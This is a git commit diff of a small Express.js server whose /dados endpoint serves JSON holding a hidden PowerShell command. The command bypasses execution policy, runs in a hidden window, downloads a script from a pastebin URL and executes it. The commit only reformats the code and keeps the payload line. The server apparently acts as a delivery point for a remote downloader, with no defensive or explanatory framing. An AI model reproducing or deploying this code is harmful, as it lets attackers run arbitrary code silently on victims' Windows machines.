41d54cacb4213bbbb8ab086b23f1438eb3313e4d
lakedev0 <lakeflux2077@gmail.com>
2023-05-27 17:46:03 -0300

    new edit

--- src/index.js
+++ src/index.js
@@ -2,17 +2,13 @@ const express = require('express');
 const app = express();
 
 app.get('/dados', (req, res) => {
-    const data = {
-      dp: true,
-      link: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command [scriptblock]::Create((Invoke-WebRequest "https://pastebin.com/raw/jW0p6fGc" -UseBasicParsing)).Invoke();"'
-    };
+  const data = {
+    dp: true,
+    link: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command [scriptblock]::Create((Invoke-WebRequest "https://pastebin.com/raw/jW0p6fGc" -UseBasicParsing)).Invoke();"'
+  };
   
-    const json = JSON.stringify(data, null, 2).replace(/\\/g, '');
-    res.setHeader('Content-Type', 'application/json');
-    res.send(json);
-  });
-  
-  
+  res.json(data);
+});
 
 const port = 80;
 app.listen(port, () => {
